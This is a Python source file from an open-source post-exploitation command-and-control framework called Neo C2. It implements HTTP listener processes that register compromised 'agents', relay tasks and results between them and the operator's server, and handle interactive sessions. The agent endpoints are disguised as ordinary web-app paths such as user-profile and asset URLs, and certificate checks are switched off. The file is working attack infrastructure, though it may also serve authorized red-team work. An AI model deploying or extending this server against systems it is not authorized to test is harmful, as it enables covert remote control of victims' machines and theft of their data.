"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

import os
import sys
import json
import time
import subprocess
import threading
import requests
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
import urllib3
import uuid

urllib3.disable_warnings(InsecureRequestWarning)


class HTTPListenerProcess:
    def __init__(self, config, db, id, name, host, port, profile_name, use_https=False):
        self.config = config
        self.db = db
        self.id = id
        self.name = name
        self.host = host
        self.port = port
        self.profile_name = profile_name
        self.use_https = use_https
        self.process = None
        self.running = False
        self.start_time = None
        
    def start(self):
        try:
            import os
            
            def check_certificates():
                import os
                if os.path.exists('server.crt') and os.path.exists('server.key'):
                    return True
                import sys
                script_dir = os.getcwd()
                
                if os.path.exists(os.path.join(script_dir, 'server.crt')) and os.path.exists(os.path.join(script_dir, 'server.key')):
                    return True
                current_path = script_dir
                for _ in range(3):
                    if os.path.exists(os.path.join(current_path, 'server.crt')) and os.path.exists(os.path.join(current_path, 'server.key')):
                        return True
                    current_path = os.path.dirname(current_path)
                return False
            
            ssl_protocol = "https" if check_certificates() else "http"
            
            listener_config = {
                'listener_id': self.id,
                'name': self.name,
                'host': self.host,
                'port': self.port,
                'profile_name': self.profile_name,
                'use_https': self.use_https,
                'web_interface_url': f"{ssl_protocol}://{self.config.get('web.host', '127.0.0.1')}:{self.config.get('web.port', 443)}",
                'web_interface_token': self.config.get('web.internal_api_token', ''),
                'flask_secret_key': self.config.get('web.secret_key', '')
            }
            
            config_path = f"/tmp/neoc2_http_listener_{self.id}_config.json"
            with open(config_path, 'w') as f:
                json.dump(listener_config, f)
            
            script_content = '''#!/usr/bin/env python3
import os
import sys
import time
import json
import uuid
import threading
import sqlite3
import logging
from datetime import datetime
from flask import Flask, request, jsonify, Blueprint
import base64
from cryptography.fernet import Fernet
from urllib3.exceptions import InsecureRequestWarning
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(InsecureRequestWarning)

# Load listener configuration
config_path = "''' + config_path + '''"
with open(config_path, 'r') as f:
    config = json.load(f)

# Initialize Flask app for this listener
app = Flask(__name__)
app.config['SECRET_KEY'] = config.get('flask_secret_key', '')

# Set up logging for this listener
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
logging.basicConfig(
    filename=os.path.join(log_dir, f"listener_" + config['listener_id'] + ".log"),
    level=logging.INFO,
    format='%(asctime)s - HTTP-''' + self.id[:8] + ''' - %(levelname)s - %(message)s'
)
logger = logging.getLogger(f"HTTP-Listener-''' + self.id + '''")

# Global variables for agent management (simplified for this process)
agents = {}
tasks = {}
results = {}
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

def get_profile_config():
    """Get profile configuration from the main web interface"""
    try:
        import requests
        web_interface_url = config.get('web_interface_url', 'https://localhost:443')
        profile_url = f"{web_interface_url}/api/profiles/{config['profile_name']}"
        auth_header = f"Bearer {config.get('web_interface_token', '')}"
        response = requests.get(profile_url, 
                               headers={"Authorization": auth_header}, 
                               verify=False)
        if response.status_code == 200:
            profile_data = response.json()
            return profile_data.get('config', {})
        else:
            logger.warning(f"Could not fetch profile {config["profile_name"]}, using defaults")
            return get_default_profile_config()
    except Exception as e:
        logger.error(f"Error fetching profile: {str(e)}")
        return get_default_profile_config()

def get_default_profile_config():
    """Return a default profile configuration"""
    return {
        "protocol": "http",
        "host": "0.0.0.0",
        "port": 443,
        "endpoints": {
            "register": "/api/users/register",
            "tasks": "/api/users/{agent_id}/profile",
            "results": "/api/users/{agent_id}/activity",
            "download": "/api/assets/main.js",
            "interactive": "/api/users/{agent_id}/settings",
            "interactive_status": "/api/users/{agent_id}/status"
        },
        "user_agent": "Mozilla/5.0",
        "headers": {},
        "heartbeat_interval": 60,
        "jitter": 0.2
    }

# Fetch profile configuration
profile_config = get_profile_config()

# Register agent endpoints based on profile configuration
endpoints = profile_config.get('endpoints', {})

# Registration endpoint
register_uri = endpoints.get('register', '/api/users/register')
@app.route(register_uri, methods=['POST'])
def register_agent():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
    
        logger.info(f"Registration request received on {config["name"]}")
        
        # Extract agent information
        ip_address = request.remote_addr
        hostname = data.get('hostname', 'unknown')
        os_info = data.get('os_info', 'unknown')
        user = data.get('user', 'unknown')
        agent_id = data.get('agent_id')
        
        # Prepare data to send to main web interface
        agent_data = {
            "ip_address": ip_address,
            "hostname": hostname,
            "os_info": os_info,
            "user": user,
            "listener_id": config["listener_id"],
            "agent_id": agent_id
        }
        
        # Forward to main web interface using the disguised endpoint
        import requests
        web_interface_url = config.get('web_interface_url', 'https://localhost:443')
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": request.remote_addr,
            "X-Real-IP": request.remote_addr
        }
        response = requests.post(f"{web_interface_url}/api/users/register", 
                               json=agent_data,
                               headers=headers,
                               verify=False)
        
        if response.status_code in [200, 201]:
            result = response.json()
            logger.info(f"Agent registered successfully: {result.get('agent_id', 'unknown')}")
            
            return jsonify({
                "status": "success",
                "agent_id": result.get('agent_id'),
                "sleep_time": profile_config.get('heartbeat_interval', 60),
                "jitter": profile_config.get('jitter', 0.2)
            }), response.status_code
        else:
            logger.error(f"Registration failed with status: {response.status_code}")
            return jsonify({"status": "error", "message": "Registration failed"}), 500

    except Exception as e:
        logger.error(f"Error in register_agent: {str(e)}")
        return jsonify({"status": "error", "message": "Internal error"}), 500

# Tasks endpoint
tasks_uri = endpoints.get('tasks', '/api/users/<agent_id>/profile')
if '{agent_id}' in tasks_uri:
    # Create dynamic route with regex replacement
    # This is handled by Flask's URL routing system
    tasks_path = tasks_uri.replace('{agent_id}', '<agent_id>')
    @app.route(tasks_path, methods=['GET'])
    def get_agent_tasks(agent_id):
        try:
            logger.info(f"Tasks request for agent {agent_id}")
            
            # Forward to main web interface using disguised endpoint
            import requests
            web_interface_url = config.get('web_interface_url', 'https://localhost:443')
            tasks_url = f"{web_interface_url}/api/users/{agent_id}/profile"
            headers = {
                "Content-Type": "application/json",
                "X-Forwarded-For": request.remote_addr,
                "X-Real-IP": request.remote_addr
            }
            response = requests.get(tasks_url, 
                                   headers=headers,
                                   verify=False)
            
            if response.status_code == 200:
                result = response.json()
                logger.info(f"Returning {len(result.get('tasks', []))} tasks for agent {agent_id}")
                return jsonify(result), 200
            else:
                logger.error(f"Tasks request failed: {response.status_code}")
                return jsonify({"status": "error", "message": "Failed to get tasks"}), 500

        except Exception as e:
            logger.error(f"Error in get_agent_tasks: {str(e)}")
            return jsonify({"status": "error", "message": "Internal error"}), 500

# Results endpoint
results_uri = endpoints.get('results', '/api/users/<agent_id>/activity')
if '{agent_id}' in results_uri:
    results_path = results_uri.replace('{agent_id}', '<agent_id>')
    @app.route(results_path, methods=['POST'])
    def submit_agent_results(agent_id):
        try:
            data = request.get_json()
            if not data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
        
            logger.info(f"Results submission from agent {agent_id}")
            
            # Forward to main web interface using disguised endpoint
            import requests
            web_interface_url = config.get('web_interface_url', 'https://localhost:443')
            headers = {
                "Content-Type": "application/json",
                "X-Forwarded-For": request.remote_addr,
                "X-Real-IP": request.remote_addr
            }
            response = requests.post(f"{web_interface_url}/api/users/{agent_id}/activity", 
                                   json={"task_id": data.get('task_id'), "result": data.get('result')},
                                   headers=headers,
                                   verify=False)
            
            if response.status_code == 200:
                result = response.json()
                logger.info(f"Results submitted successfully for agent {agent_id}")
                return jsonify(result), 200
            else:
                logger.error(f"Results submission failed: {response.status_code}")
                return jsonify({"status": "error", "message": "Failed to submit results"}), 500

        except Exception as e:
            logger.error(f"Error in submit_agent_results: {str(e)}")
            return jsonify({"status": "error", "message": "Internal error"}), 500

# Interactive endpoints
interactive_uri = endpoints.get('interactive', '/api/users/<agent_id>/settings')
if '{agent_id}' in interactive_uri:
    interactive_path = interactive_uri.replace('{agent_id}', '<agent_id>')
    @app.route(interactive_path, methods=['GET', 'POST'])
    def handle_interactive_communication(agent_id):
        try:
            method = request.method
            logger.info(f"Interactive {method} request for agent {agent_id}")
            
            import requests
            web_interface_url = config.get('web_interface_url', 'https://localhost:443')
            headers = {
                "Content-Type": "application/json",
                "X-Forwarded-For": request.remote_addr,
                "X-Real-IP": request.remote_addr
            }
            
            if method == 'GET':
                response = requests.get(f"{web_interface_url}/api/users/{agent_id}/settings", 
                                       headers=headers,
                                       verify=False)
            else:  # POST
                response = requests.post(f"{web_interface_url}/api/users/{agent_id}/settings", 
                                       json=request.get_json(),
                                       headers=headers,
                                       verify=False)
            
            if response.status_code == 200:
                result = response.json()
                return jsonify(result), 200
            else:
                return jsonify({"status": "error", "message": "Interactive comm failed"}), 500

        except Exception as e:
            logger.error(f"Error in interactive communication: {str(e)}")
            return jsonify({"status": "error", "message": "Internal error"}), 500

# Additional disguised endpoints based on profile
for endpoint_name, endpoint_path in endpoints.items():
    if endpoint_name not in ['register', 'tasks', 'results', 'interactive']:
        # Create additional routes based on profile
        if '{agent_id}' in endpoint_path:
            route_path = endpoint_path.replace('{agent_id}', '<agent_id>')
            
            if endpoint_name in ['download']:
                @app.route(route_path, methods=['GET'])
                def handle_download(agent_id):
                    try:
                        logger.info(f"Download request for agent {agent_id}")
                        return "Agent payload would be returned here", 200
                    except Exception as e:
                        logger.error(f"Download error: {str(e)}")
                        return "Error", 500
        else:
            # Static endpoint (no agent_id)
            @app.route(endpoint_path, methods=['GET', 'POST'])
            def handle_static_endpoint():
                try:
                    logger.info(f"Static endpoint request: {endpoint_path}")
                    # For static endpoints, we might need to determine the agent differently
                    # or they might be used for other purposes
                    return "OK", 200
                except Exception as e:
                    logger.error(f"Static endpoint error: {str(e)}")
                    return "Error", 500

# Add protocol negotiation endpoint - this is critical for multi-protocol agents
@app.route('/api/protocol/negotiate', methods=['POST'])
def handle_protocol_negotiate():
    try:
        logger.info("Protocol negotiation request received on HTTP listener")
        
        import requests
        web_interface_url = config.get('web_interface_url', 'https://localhost:443')
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": request.remote_addr,
            "X-Real-IP": request.remote_addr
        }
        response = requests.post(f"{web_interface_url}/api/protocol/negotiate", 
                               json=request.get_json(),
                               headers=headers,
                               verify=False)
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        logger.error(f"Error in protocol negotiation: {str(e)}")
        return jsonify({"status": "error", "message": "Protocol negotiation failed"}), 500



# Endpoint for auto-discovery service to query this listener's endpoints
@app.route('/api/listener-info', methods=['GET'])
def get_listener_info():
    try:
        return jsonify({
            "listener_id": config["listener_id"],
            "name": config["name"],
            "host": config["host"],
            "port": config["port"],
            "profile": config["profile_name"],
            "endpoints": profile_config.get('endpoints', {}),
            "protocol": profile_config.get('protocol', 'http')
        })
    except Exception as e:
        logger.error(f"Error in get_listener_info: {str(e)}")
        return jsonify({"status": "error", "message": "Internal error"}), 500

# Health check endpoint
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "listener_id": config["listener_id"],
        "name": config["name"],
        "port": config["port"]
    })

if __name__ == "__main__":
    ssl_context = None
    if config.get('use_https', False):
        # Look for SSL certificates in common locations
        ssl_cert = "server.crt"
        ssl_key = "server.key"
        if os.path.exists(ssl_cert) and os.path.exists(ssl_key):
            ssl_context = (ssl_cert, ssl_key)
        else:
            logger.warning("SSL requested but certificates not found, running HTTP only")
    
    logger.info(f"Starting HTTP listener '{config["name"]}' on {config["host"]}:{config["port"]}")
    logger.info(f"Using profile: {config["profile_name"]}")
    logger.info(f"Endpoints: {list(profile_config.get('endpoints', {}).keys())}")
    
    app.run(host=config["host"], port=config["port"], ssl_context=ssl_context, 
            threaded=True, debug=False, use_reloader=False)
'''
            
            script_path = f"/tmp/neoc2_http_listener_{self.id}.py"
            with open(script_path, 'w') as f:
                f.write(script_content)
            
            cmd = [sys.executable, script_path]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=os.environ.copy()
            )
            
            self.running = True
            self.start_time = datetime.now()
            
            print(f"[+] HTTP listener '{self.name}' started on port {self.port} with PID {self.process.pid}")
            return {
                'success': True,
                'pid': self.process.pid,
                'message': f'HTTP listener {self.name} started on port {self.port}'
            }
            
        except Exception as e:
            error_msg = f"Error starting HTTP listener process: {str(e)}"
            print(f"[-] {error_msg}")
            import traceback
            traceback.print_exc()
            return {
                'success': False,
                'error': error_msg
            }
    
    def stop(self):
        try:
            if self.process and self.running:
                self.process.terminate()
                
                try:
                    self.process.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    self.process.kill()
                
                config_file = f"/tmp/neoc2_http_listener_{self.id}_config.json"
                if os.path.exists(config_file):
                    os.remove(config_file)
                
                script_path = f"/tmp/neoc2_http_listener_{self.id}.py"
                if os.path.exists(script_path):
                    os.remove(script_path)
                
                self.running = False
                print(f"[+] HTTP listener '{self.name}' stopped successfully")
                return {
                    'success': True,
                    'message': f'HTTP listener {self.name} stopped'
                }
            else:
                return {
                    'success': True,
                    'message': f'HTTP listener {self.name} was not running'
                }
                
        except Exception as e:
            error_msg = f"Error stopping HTTP listener: {str(e)}"
            print(f"[-] {error_msg}")
            return {
                'success': False,
                'error': error_msg
            }
    
    def is_running(self):
        if self.process:
            return self.process.poll() is None
        return False


class HTTPListenerProcessManager:
    def __init__(self, config, db):
        self.config = config
        self.db = db
        self.listeners = {}  # listener_id -> HTTPListenerProcess instance
        self.running = False
    
    def create_listener(self, listener_type, **kwargs):
        try:
            name = kwargs.get('name')
            if not name:
                return {"success": False, "error": "Listener name is required."}

            if self.db.get_listener_by_name(name):
                return {"success": False, "error": f"Listener with name '{name}' already exists."}

            listener_id = str(uuid.uuid4())
            
            self.db.create_listener(
                listener_id=listener_id,
                name=name,
                listener_type=listener_type,
                host=kwargs.get('host', '0.0.0.0'),
                port=kwargs.get('port'),
                profile_name=kwargs.get('profile_name', 'default'),
                config=None  # Config is now handled by profiles
            )
            
            return {
                "success": True, 
                "listener_id": listener_id,
                "message": f"HTTP listener '{name}' created. Start it to activate on its own port."
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def start_listener(self, listener_id):
        try:
            listener_data = self.db.get_listener(listener_id)
            if not listener_data:
                return {"success": False, "error": f"Listener {listener_id} not found"}

            if listener_id in self.listeners and self.listeners[listener_id].is_running():
                return {"success": True, "message": "HTTP listener is already running."}

            http_listener = HTTPListenerProcess(
                config=self.config,
                db=self.db,
                id=listener_data['id'],
                name=listener_data['name'],
                host=listener_data['host'],
                port=listener_data['port'],
                profile_name=listener_data['profile_name'],
                use_https=(listener_data['type'] == 'https')
            )
            
            result = http_listener.start()
            
            if result['success']:
                self.listeners[listener_id] = http_listener
                self.db.update_listener_status(listener_id, 'running')
                return result
            else:
                return result
                
        except Exception as e:
            error_msg = f"Error starting HTTP listener: {str(e)}"
            print(f"[-] {error_msg}")
            import traceback
            traceback.print_exc()
            return {"success": False, "error": error_msg}

    def stop_listener(self, listener_id):
        try:
            if listener_id in self.listeners:
                result = self.listeners[listener_id].stop()
                del self.listeners[listener_id]
                
                self.db.update_listener_status(listener_id, 'stopped')
                
                return result
            else:
                return {"success": False, "error": f"HTTP listener {listener_id} not found or not running"}
                
        except Exception as e:
            error_msg = f"Error stopping HTTP listener: {str(e)}"
            print(f"[-] {error_msg}")
            return {"success": False, "error": error_msg}

    def get_listener(self, listener_id):
        try:
            listener = self.db.get_listener(listener_id)
            if not listener:
                return {"success": False, "error": "Listener not found."}
            
            process_info = None
            if listener_id in self.listeners:
                process = self.listeners[listener_id]
                process_info = {
                    'is_running': process.is_running(),
                    'start_time': process.start_time.isoformat() if process.start_time else None
                }
            
            listener['process_info'] = process_info
            return {"success": True, "listener": listener}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def list_listeners(self):
        try:
            listeners = self.db.get_listeners()
            
            for listener in listeners:
                process_info = None
                if listener['id'] in self.listeners:
                    process = self.listeners[listener['id']]
                    process_info = {
                        'is_running': process.is_running(),
                        'start_time': process.start_time.isoformat() if process.start_time else None
                    }
                
                listener['process_info'] = process_info
            
            return {"success": True, "listeners": listeners}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def start_all(self):
        try:
            http_listeners = [
                l for l in self.db.get_listeners(status='running') 
                if l['type'] in ['http', 'https']
            ]
            
            started_count = 0
            for listener in http_listeners:
                result = self.start_listener(listener['id'])
                if result.get('success'):
                    started_count += 1
            
            return {
                "success": True, 
                "message": f"Started {started_count} HTTP listeners on separate ports."
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def stop_all(self):
        try:
            stopped_count = 0
            for listener_id in list(self.listeners.keys()):
                result = self.stop_listener(listener_id)
                if result.get('success'):
                    stopped_count += 1
            
            return {
                "success": True, 
                "message": f"Stopped {stopped_count} HTTP listeners."
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
